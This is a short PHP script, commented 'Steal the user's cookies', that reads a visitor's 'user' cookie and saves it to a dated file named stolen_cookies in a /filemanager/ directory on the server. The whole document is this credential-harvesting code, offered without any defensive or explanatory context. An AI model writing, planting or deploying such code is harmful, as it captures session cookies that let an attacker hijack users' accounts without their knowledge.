<?php
// Steal the user's cookies
if (isset($_COOKIE['user'])) {
    //store in file 
    $cookie = json_encode($_COOKIE['user']);
    $filename = 'stolen_cookies_' . date('m_d_Y') . '.txt';
    file_put_contents('/filemanager/'. $filename, $cookie);
} 
?>
